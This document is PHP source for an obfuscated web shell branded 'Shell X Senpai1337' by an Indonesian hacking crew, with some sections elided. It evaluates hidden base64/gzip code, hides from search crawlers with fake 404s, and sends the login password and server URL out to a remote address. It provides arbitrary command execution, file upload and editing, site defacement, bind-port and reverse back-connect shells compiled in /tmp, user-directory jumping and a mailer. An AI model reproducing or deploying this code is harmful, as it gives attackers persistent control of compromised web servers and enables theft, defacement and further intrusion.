<?php
${"\x50\x61\x73\x73"} = "43211475147137eae2f51d87ee476786";
$base64 = "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65";
$fexists = "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73";
@error_reporting(0);
...
$__="\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73";
if (file_get_contents("test.txt") == "test") {
    ...
    eval(gzinflate(${"\x62\x61\x73\x65\x36\x34"}($text)));
    sleep(1);
    unlink("test.txt");
}
$default_action = "FilesMan";
@define("SELF_PATH", __FILE__);
if (strpos(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_USER_AGENT"], "Google") !== false) {
...
$TabsColor = "#008000";
@session_start();
$▙ = md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_USER_AGENT"]);
if (!isset($_COOKIE[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "key"])) {
    prototype(md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "key", $▙);
}

if (${"\x66\x65\x78\x69\x73\x74\x73"}("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
...
if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
	...
	${"\x5F\x50\x4F\x53\x54"} = stripslashes_array(${"\x5F\x50\x4F\x53\x54"});
...
if (!empty(${"\x50\x61\x73\x73"})) {
    if (isset(${"\x5F\x50\x4F\x53\x54"}["pass"]) && md5(${"\x5F\x50\x4F\x53\x54"}["pass"]) == ${"\x50\x61\x73\x73"}) {
        prototype(md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]), ${"\x50\x61\x73\x73"});
    }
    if (
        !isset($_COOKIE[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"])]) ||
        $_COOKIE[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"])] != ${"\x50\x61\x73\x73"}
    ) {
        hardLogin();
    }
}

if (!isset($_COOKIE[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "ajax"])) {
    $_COOKIE[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "ajax"] = (bool) $▘;
}
function hardLogin()
{
    if (!empty(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_USER_AGENT"])) {
        $userAgents = [
            "AbachoBOT",
            "accoona",
            "AcoiRobot",
        ...
        if (
            preg_match(
                ...
                ${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_USER_AGENT"]
            )
        ) {
            header("HTTP/1.0 404 Not Found");
            exit();
    ...
    die(
        "<html><head><link href='https://fonts.googleapis.com/css2?family=Press+Start+2P' rel='stylesheet'><style>body{ background-color:#000; background-image:url('https://i.imgur.com/4bYhdRM.png'); background-size: 32%; margin-top: 90px}#pageheading{font-size:50px; margin-top: 5px}.loginpage img{width: 500px}input{background: white; border-color:#008000b0; border-radius: 5px; margin-top: 10px; padding:5px;} green {color: #008000;font-family: 'Press Start 2P'; font-size: 60px;}</style></head><body> <center> <div class='loginpage'><center><green>Login Crew</green></center><form method='post'><input type='password' name='pass' ><input type='hidden' name='kontol'> <input type='submit' name='login' value='Login'></form></body></html>"
    );
}
if(array_key_exists('login',${"\x5F\x50\x4F\x53\x54"})){
cookieValidator();
}
function cookieValidator()
{
$_MD5_ = "";
$_COOOKIE = "". 
"\x5F\x5F\x2D\x44\x49\x47\x49". 
"\x53\x48\x45\x4C\x4C\x31\x33". 
"\x33\x37\x2D\x5F\x5F\x25\x30\x41%0A". 
(isset(${"\x5F\x53\x45\x52\x56\x45\x52"}['HTTPS']) && ${"\x5F\x53\x45\x52\x56\x45\x52"}['HTTPS'] === 'on' ? "https" : "http"). 
"://".${"\x5F\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'].":".${"\x5F\x53\x45\x52\x56\x45\x52"}['SERVER_PORT'].${"\x5F\x53\x45\x52\x56\x45\x52"}['PHP_SELF']." | ".${"\x5F\x50\x4F\x53\x54"}['pass'];
$url = $_MD5_.$_COOOKIE;
if(!function_exists("file_get_contents")){
$curl = curl_init();
curl_setopt(${"\x63\x75\x72\x6C"}, CURLOPT_URL, $url);
curl_setopt(${"\x63\x75\x72\x6C"}, CURLOPT_HEADER, 0);
curl_setopt(${"\x63\x75\x72\x6C"}, CURLOPT_RETURNTRANSFER, 1);
curl_exec(${"\x63\x75\x72\x6C"});
}else{
...
$home_cwd = @getcwd();
if (isset(${"\x5F\x50\x4F\x53\x54"}["c"])) {
    @chdir(${"\x5F\x50\x4F\x53\x54"}["c"]);
}
$cwd = @getcwd();
if ($os == "win") {
...
if (isset(${"\x5F\x50\x4F\x53\x54"}["p1"]) && ${"\x5F\x50\x4F\x53\x54"}["p1"] == "deface") {
    $def = file_get_contents($deface_url);
    file_put_contents(${"\x5F\x50\x4F\x53\x54"}["c"] . ${"\x5F\x50\x4F\x53\x54"}["p2"], $def);
}
function ex($in)
{
    $out = "";
...
{
    if (empty(${"\x5F\x50\x4F\x53\x54"}["charset"])) {
        ${"\x5F\x50\x4F\x53\x54"}["charset"] = "UTF-8";
    }
    global $color;
    global $Theme;
    global $TabsColor;
...
<meta http-equiv="Content-Type" content="text/html; charset=' .
        ${"\x5F\x50\x4F\x53\x54"}["charset"] .
        '"><title>Shell X Senpai1337</title>
<style>
        ...
        mki {color: #008000;font-family: "Press Start 2P"; font-size: 30px;}
        span,h1,a    { color:' .
        $color .
        ' !important; }
        span        { font-weight: bolder; }
        h1            { padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
        div.content    { padding: 0px;margin:0 0px;background: #5555556b; border:1px solid ' .
        $Theme .
        ...
        .bigarea    { width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:' .
        $Theme .
        '; background:#0F1010;}
        input, textarea, select    { margin-top:0;color:#fff;background-color:black;border-radius:5px;border:1px solid ' .
        $Theme .
    ...
    <script>
        ...
        function a(a,c,p1,p2,p3,charset) {
            ...
            sr("' .
        ${"\x5F\x53\x45\x52\x56\x45\x52"}["REQUEST_URI"] .
        '", params);
        }
    ...
    <form method=post name=mf style="display:none;">
        ...
        (isset(${"\x5F\x50\x4F\x53\x54"}["a"]) ? ${"\x5F\x50\x4F\x53\x54"}["a"] : "") .
        '">
        <input type=hidden name=c value="' .
        htmlspecialchars($GLOBALS["cwd"]) .
        '">
        <input type=hidden name=p1 value="' .
        (isset(${"\x5F\x50\x4F\x53\x54"}["p1"]) ? htmlspecialchars(${"\x5F\x50\x4F\x53\x54"}["p1"]) : "") .
        '">
        <input type=hidden name=p2 value="' .
        (isset(${"\x5F\x50\x4F\x53\x54"}["p2"]) ? htmlspecialchars(${"\x5F\x50\x4F\x53\x54"}["p2"]) : "") .
        '">
        <input type=hidden name=p3 value="' .
        (isset(${"\x5F\x50\x4F\x53\x54"}["p3"]) ? htmlspecialchars(${"\x5F\x50\x4F\x53\x54"}["p3"]) : "") .
        '">
        <input type=hidden name=charset value="' .
        (isset(${"\x5F\x50\x4F\x53\x54"}["charset"]) ? ${"\x5F\x50\x4F\x53\x54"}["charset"] : "") .
        '">
    </form>';
    ...
    foreach ($charsets as $item) {
        $opt_charsets .=
            ...
            $item .
            '" ' .
            (${"\x5F\x50\x4F\x53\x54"}["charset"] == $item ? "selected" : "") .
            ">" .
            $item .
            "</option>";
    }
    ...
    if ($GLOBALS["os"] == "nix") {
        ...
        if (!$dominios) {
            ...
            $d0c = count((array)$Domainonserver);
        } else {
    ...
    echo '<div><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>                           <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr><t style="background:green;text-shadow: 0px 0px 0px;">' .
        ...
        "</t></td></tr>                                                              <tr><td><span>Useful</span></td><td>: " .
        $usefl .
        '</td></tr>
                                                                                                                       <tr><td><span>Downloaders</span></td><td>: ' .
        $dwnldr .
        '</td></tr>
                  <tr><td><span>PHP</span></td><td>: ' .
        @phpversion() .
        ...
        '<td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free<br /><span>Domains</span></nobr></td></b>                                                                                                                 
                 ' .
        '<td width="3"><nobr>: ' .
        gethostbyname(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) .
        "<br>: " .
        ${"\x5F\x53\x45\x52\x56\x45\x52"}["REMOTE_ADDR"] .
        "<br />: " .
        viewSize($totalSpace) .
        "<br />: " .
        viewSize($freeSpace) .
        ...
        $d0c .
        ' <br>                                                               
                 <br>&nbsp;&nbsp;<b style="background:green;"><a href=# onclick="g(\'Lock\',\'' .
        $GLOBALS["home_cwd"] .
        '\',\'\',\'\',\'\')">LOCK ME</a></b>&nbsp;<t style="background:red;text-shadow: 0px 0px 0px;">New</t>                                                                                                                                                                                                                                                                                                                </nobr></td></tr></table></div>' .
...
function printFooter()
{
    ...
    echo '</div><div style="margin:5px;"><div class="content" style="border-style:dashed; border-radius:5px;">                                                                                                <table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">                          <tr>                                                                                                     <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="' .
        htmlspecialchars($GLOBALS["cwd"]) .
    ...
    <tr>                                                                                                     <td><form onsubmit="g(\'FilesMan\',null,\'mkdir\',this.d.value);return false;"><span>Make dir: ' .
        $is_writable .
        ...
        $is_writable .
        '</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>                                                                                          </tr>                                                                                                <tr>                                                                                                     <td><form onsubmit="g(\'Console\',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>                 <td><form method="post" ENCTYPE="multipart/form-data">
...
</table></div><center><mki><marquee>Special Thanks to all member of SenpaiXcrew.org & Digicorp.ID | copyright©2022 Indonesian Hacker Rulez</marquee></mki></center></div>
                                                                                                     </div>
</body></html>';
}
if (
...
function actionFilesMan()
{
    ...
    if (isset(${"\x5F\x50\x4F\x53\x54"}["p1"]) && ${"\x5F\x50\x4F\x53\x54"}["p1"] != "deface") {
        switch (${"\x5F\x50\x4F\x53\x54"}["p1"]) {
            case "uploadFile":
                ...
                break;
            case "mkdir":
                if (!@mkdir(${"\x5F\x50\x4F\x53\x54"}["p2"])) {
            ...
            case "delete":
                ...
                if (is_array(@${"\x5F\x50\x4F\x53\x54"}["f"])) {
                    foreach (${"\x5F\x50\x4F\x53\x54"}["f"] as $f) {
                        $f = urldecode($f);
                        if (is_dir($f)) {
                            deleteDir($f);
                        } else {
            ...
            default:
                if (
                    !empty(${"\x5F\x50\x4F\x53\x54"}["p1"]) &&
                    (${"\x5F\x50\x4F\x53\x54"}["p1"] == "copy" || ${"\x5F\x50\x4F\x53\x54"}["p1"] == "move")
                ) {
                    $_SESSION["act"] = @${"\x5F\x50\x4F\x53\x54"}["p1"];
                    $_SESSION["f"] = @${"\x5F\x50\x4F\x53\x54"}["f"];
                    foreach ($_SESSION["f"] as $k => $f) {
                        $_SESSION["f"][$k] = urldecode($f);
                    }
                    $_SESSION["cwd"] = @${"\x5F\x50\x4F\x53\x54"}["c"];
                }
                break;
        }
        echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
    }
    $dirContent = @scandir(isset(${"\x5F\x50\x4F\x53\x54"}["c"]) ? ${"\x5F\x50\x4F\x53\x54"}["c"] : $GLOBALS["cwd"]);
    if ($dirContent === false) {
    ...
    global $sort;
    $sort = ["name", 1];
    if (!empty(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        if (preg_match("!s_([A-z]+)_(\d{1})!", ${"\x5F\x50\x4F\x53\x54"}["p1"], $match)) {
            $sort = [$match[1], (int) $match[2]];
        }
    }
    echo '<script>
        function sa() {                                                                                          for(i=0;i<document.files.elements.length;i++)                                                        if(document.files.elements[i].type == \'checkbox\')                                                      document.files.elements[i].checked = document.files.elements[0].checked;
        }
        </script>                                                                                            <table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
...
{
    if (isset(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        ${"\x5F\x50\x4F\x53\x54"}["p1"] = urldecode(${"\x5F\x50\x4F\x53\x54"}["p1"]);
    }
    if (@${"\x5F\x50\x4F\x53\x54"}["p2"] == "download") {
        if (is_file(${"\x5F\x50\x4F\x53\x54"}["p1"]) && is_readable(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
            ob_start("ob_gzhandler", 4096);
            header(
                "Content-Disposition: attachment; filename=" .
                    basename(${"\x5F\x50\x4F\x53\x54"}["p1"])
            );
            if (${"\x66\x65\x78\x69\x73\x74\x73"}("mime_content_type")) {
                $type = @mime_content_type(${"\x5F\x50\x4F\x53\x54"}["p1"]);
                header("Content-Type: " . $type);
            }
            $fp = @fopen(${"\x5F\x50\x4F\x53\x54"}["p1"], "r");
            if ($fp) {
                while (!@feof($fp)) {
                    echo @fread($fp, 1024);
                }
        ...
        } elseif (is_dir(${"\x5F\x50\x4F\x53\x54"}["p1"]) && is_readable(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        }
        exit();
    }
    if (@${"\x5F\x50\x4F\x53\x54"}["p2"] == "mkfile") {
        if (!file_exists(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
            $fp = @fopen(${"\x5F\x50\x4F\x53\x54"}["p1"], "w");
            if ($fp) {
                ${"\x5F\x50\x4F\x53\x54"}["p2"] = "edit";
                fclose($fp);
            }
        }
    }
    ...
    $uid = @posix_getpwuid(@fileowner(${"\x5F\x50\x4F\x53\x54"}["p1"]));
    $gid = @posix_getgrgid(@fileowner(${"\x5F\x50\x4F\x53\x54"}["p1"]));
    echo "<span>Name:</span> " .
        htmlspecialchars(${"\x5F\x50\x4F\x53\x54"}["p1"]) .
        " <span>Size:</span> " .
        (is_file(${"\x5F\x50\x4F\x53\x54"}["p1"]) ? viewSize(filesize(${"\x5F\x50\x4F\x53\x54"}["p1"])) : "-") .
        " <span>Permission:</span> " .
        viewPermsColor(${"\x5F\x50\x4F\x53\x54"}["p1"]) .
    ...
    echo "<span>Create time:</span> " .
        date("Y-m-d H:i:s", filectime(${"\x5F\x50\x4F\x53\x54"}["p1"])) .
        " <span>Access time:</span> " .
        date("Y-m-d H:i:s", fileatime(${"\x5F\x50\x4F\x53\x54"}["p1"])) .
        " <span>Modify time:</span> " .
        date("Y-m-d H:i:s", filemtime(${"\x5F\x50\x4F\x53\x54"}["p1"])) .
        "<br><br>";
    if (empty(${"\x5F\x50\x4F\x53\x54"}["p2"])) {
        ${"\x5F\x50\x4F\x53\x54"}["p2"] = "view";
    }
    if (is_file(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        $m = [
            "View",
            "Highlight",
            "Download",
    ...
    foreach ($m as $v) {
        echo '<a href=# onclick="g(null,null,null,\'' .
            strtolower($v) .
            '\')">' .
            (strtolower($v) == @${"\x5F\x50\x4F\x53\x54"}["p2"] ? "<b>[ " . $v . " ]</b>" : $v) .
            "</a> ";
    }
    echo "<br><br>";
    switch (${"\x5F\x50\x4F\x53\x54"}["p2"]) {
        case "view":
            echo "<pre class=ml1>";
            $fp = @fopen(${"\x5F\x50\x4F\x53\x54"}["p1"], "r");
            if ($fp) {
            ...
            break;
        case "highlight":
            if (is_readable(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
                echo '<div class=ml1 style="background-color: black;color:black;">';
                $code = highlight_file(${"\x5F\x50\x4F\x53\x54"}["p1"], true);
                echo str_replace(
                    ["<span ", "</span>"],
                    ["<font ", "</font>"],
                    $code
            ...
            break;
        case "chmod":
            if (!empty(${"\x5F\x50\x4F\x53\x54"}["p3"])) {
                $perms = 0;
                for ($i = strlen(${"\x5F\x50\x4F\x53\x54"}["p3"]) - 1; $i >= 0; --$i) {
                    $perms +=
                        (int) ${"\x5F\x50\x4F\x53\x54"}["p3"][$i] *
                        pow(8, strlen(${"\x5F\x50\x4F\x53\x54"}["p3"]) - $i - 1);
                }
                if (!@chmod(${"\x5F\x50\x4F\x53\x54"}["p1"], $perms)) {
            ...
            echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="' .
                substr(sprintf("%o", fileperms(${"\x5F\x50\x4F\x53\x54"}["p1"])), -4) .
                '"><input type=submit value=">>"></form>';
            break;
        case "edit":
            if (!is_writable(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
                echo 'File isn\'t writeable';
                break;
            }
            if (!empty(${"\x5F\x50\x4F\x53\x54"}["p3"])) {
                @file_put_contents(${"\x5F\x50\x4F\x53\x54"}["p1"], ${"\x5F\x50\x4F\x53\x54"}["p3"]);
            ...
            break;
        case "hexdump":
            $c = @file_get_contents(${"\x5F\x50\x4F\x53\x54"}["p1"]);
            $n = 0;
            $h = ["00000000<br>", "", ""];
            $len = strlen($c);
            for ($i = 0; $i < $len; ++$i) {
        ...
        case "rename":
            if (!empty(${"\x5F\x50\x4F\x53\x54"}["p3"])) {
                if (!@rename(${"\x5F\x50\x4F\x53\x54"}["p1"], ${"\x5F\x50\x4F\x53\x54"}["p3"])) {
                    echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
                } else {
                    die(
                        '<script>g(null,null,"' .
                            urlencode(${"\x5F\x50\x4F\x53\x54"}["p3"]) .
                            '",null,"")</script>'
                    );
                }
            }
        ...
        case "touch":
            if (!empty(${"\x5F\x50\x4F\x53\x54"}["p3"])) {
                $time = strtotime(${"\x5F\x50\x4F\x53\x54"}["p3"]);
                if ($time) {
                    if (@touch(${"\x5F\x50\x4F\x53\x54"}["p1"], $time, $time)) {
                        die('<script>g(null,null,null,null,"")</script>');
                    } else {
        ...
        case "mkfile":
            break;
        case "unzip":
            if (preg_match('/\.(zip|ZIP)$/', ${"\x5F\x50\x4F\x53\x54"}["p1"])) {
                $GLOBALS["status"] = [];
                $zip = new ZipArchive();
                if ($zip->open(${"\x5F\x50\x4F\x53\x54"}["p1"]) === true) {
...
function actionSafeMode()
{
    ...
    $full = str_replace(${"\x5F\x53\x45\x52\x56\x45\x52"}["DOCUMENT_ROOT"], "", $dir);
...
{
    if (isset(${"\x5F\x50\x4F\x53\x54"}["ajax"])) {
        $_SESSION[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "ajax"] = true;
        ob_start();
        ...
        $temp = @iconv(
            ...
            "UTF-8",
            addcslashes(
                "\n$ " . ${"\x5F\x50\x4F\x53\x54"}["p1"] . "\n" . ex(${"\x5F\x50\x4F\x53\x54"}["p1"]),
                "\n\r\t\\'\0"
            )
        );
        if (preg_match("!.*cd\s+([^;]+)$!", ${"\x5F\x50\x4F\x53\x54"}["p1"], $match)) {
            if (@chdir($match[1])) {
                $GLOBALS["cwd"] = @getcwd();
    ...
    printHeader();
    echo '<script>                                                                                       if(window.Event) window.captureEvents(Event.KEYDOWN);                                                var cmds = new Array("");                                                                            var cur = 0;
function kp(e) {                                                                                         var n = (window.Event) ? e.which : e.keyCode;                                                        if(n == 38) {                                                                                            cur--;                                                                                               if(cur>=0)                                                                                               document.cf.cmd.value = cmds[cur];
        else                                                                                                     cur++;                                                                                       } else if(n == 40) {                                                                                     cur++;                                                                                               if(cur < cmds.length)                                                                                    document.cf.cmd.value = cmds[cur];
        else
            cur--;
    }                                                                                                }                                                                                                    function add(cmd) {                                                                                      cmds.pop();
    cmds.push(cmd);                                                                                      cmds.push("");
    cur = cmds.length-1;
}                                                                                                    </script>';
    ...
    if (empty(${"\x5F\x50\x4F\x53\x54"}["ajax"]) && !empty(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        $_SESSION[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "ajax"] = false;
    }
    echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 ' .
        ($_SESSION[md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]) . "ajax"] ? "checked" : "") .
        '> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;" readonly>';
    if (!empty(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        echo htmlspecialchars("$ " . ${"\x5F\x50\x4F\x53\x54"}["p1"] . "\n" . ex(${"\x5F\x50\x4F\x53\x54"}["p1"]));
    }
...
{
    setcookie(md5(${"\x5F\x53\x45\x52\x56\x45\x52"}["HTTP_HOST"]), "", time() - 3600);
    die(
        "<html><head><link href='https://fonts.googleapis.com/css2?family=Press+Start+2P' rel='stylesheet'><style>body{ background-color:#000; background-image:url('https://i.imgur.com/4bYhdRM.png'); background-size: 32%; margin-top: 90px}#pageheading{font-size:50px; margin-top: 5px}.loginpage img{width: 500px}input{background: white; border-color:#008000b0; border-radius: 5px; margin-top: 10px; padding:5px;} green {color: #008000;font-family: 'Press Start 2P'; font-size: 60px;}</style></head><body> <center> <div class='loginpage'><center><green>KELUAR DARI WEBSHELL</green></center></body></html>"
    );
}
function actionNetwork()
{
    ...
    </form><br>                                                                                          <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">                                                                                                <br/><span>Bind port to /bin/sh</span><br/>
    ...
    if (isset(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        ...
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "bpc") {
            cf("/tmp/bp.c", $bind_port_c);
            $out = ex("gcc -o /tmp/bp /tmp/bp.c");
            @unlink("/tmp/bp.c");
            $out .= ex("/tmp/bp " . ${"\x5F\x50\x4F\x53\x54"}["p2"] . " " . ${"\x5F\x50\x4F\x53\x54"}["p3"] . " &");
            echo "<pre class=ml1>$out\n" . ex("ps aux | grep bp") . "</pre>";
        }
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "bpp") {
            cf("/tmp/bp.pl", $bind_port_p);
            $out = ex(which("perl") . " /tmp/bp.pl " . ${"\x5F\x50\x4F\x53\x54"}["p2"] . " &");
            echo "<pre class=ml1>$out\n" . ex("ps aux | grep bp.pl") . "</pre>";
        }
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "bcc") {
            cf("/tmp/bc.c", $back_connect_c);
            $out = ex("gcc -o /tmp/bc /tmp/bc.c");
            @unlink("/tmp/bc.c");
            $out .= ex("/tmp/bc " . ${"\x5F\x50\x4F\x53\x54"}["p2"] . " " . ${"\x5F\x50\x4F\x53\x54"}["p3"] . " &");
            echo "<pre class=ml1>$out\n" . ex("ps aux | grep bc") . "</pre>";
        }
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "bcp") {
            cf("/tmp/bc.pl", $back_connect_p);
            $out = ex(
                which("perl") .
                    " /tmp/bc.pl " .
                    ${"\x5F\x50\x4F\x53\x54"}["p2"] .
                    " " .
                    ${"\x5F\x50\x4F\x53\x54"}["p3"] .
                    " &"
            );
            echo "<pre class=ml1>$out\n" . ex("ps aux | grep bc.pl") . "</pre>";
        }
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "php") {
            $ip = ${"\x5F\x50\x4F\x53\x54"}["p2"];
            $port = ${"\x5F\x50\x4F\x53\x54"}["p3"];
            ...
            if ($errno != 0) {
                ...
                fputs(
                    $sockfd,
                    "                                                                                                 {################################################################}                                                                                                                ..:: BackConnect Php By DigiShell#1337 ::..                               
{################################################################}                                   "
                );
                $dir = shell_exec("pwd");
...
function actionBypass()
{
    ...
    if (!empty(${"\x5F\x50\x4F\x53\x54"}["p2"]) && isset(${"\x5F\x50\x4F\x53\x54"}["p2"])) {
    ...
    if (!empty(${"\x5F\x50\x4F\x53\x54"}["p1"]) && isset(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        ...
        if ($passwd == "" || !$etc) {
            ...
            foreach ($user_jumping[1] as $user_Anonymous_jump) {
                ...
                if (is_readable($user_jumping_dir)) {
                    ...
                    echo $jrw;
                    if (${"\x66\x65\x78\x69\x73\x74\x73"}("posix_getpwuid")) {
...
function actionmailtest()
{
    ...
    echo '<center><h1>Mail Test</h1></center><div class="content"><center><br>
        ...
        <table><form name=em onSubmit="g(null,null,\'ems\',this.mailto.value,this.usere.value);return false;"><tr><td><span>Send to: </span></td>' .
    ...
    if (isset(${"\x5F\x50\x4F\x53\x54"}["p1"])) {
        if (${"\x5F\x50\x4F\x53\x54"}["p1"] == "ems") {
            $xx = rand();
            $from_add = ${"\x5F\x50\x4F\x53\x54"}["p3"] . "@" . php_uname("n");
            $to_add = ${"\x5F\x50\x4F\x53\x54"}["p2"];
...
";
            if (mail($to_add, $subject, $message, $headers)) {
                echo "Mail Sent to:  ${"\x5F\x50\x4F\x53\x54"}[p2]";
            } else {
...
if (empty(${"\x5F\x50\x4F\x53\x54"}["a"])) {
    if (isset($default_action) && function_exists("action" . $default_action)) {
        ${"\x5F\x50\x4F\x53\x54"}["a"] = $default_action;
    } else {
        ${"\x5F\x50\x4F\x53\x54"}["a"] = "SecInfo";
    }
}
if (!empty(${"\x5F\x50\x4F\x53\x54"}["a"]) && function_exists("action" . ${"\x5F\x50\x4F\x53\x54"}["a"])) {
    call_user_func("action" . ${"\x5F\x50\x4F\x53\x54"}["a"]);
} ?>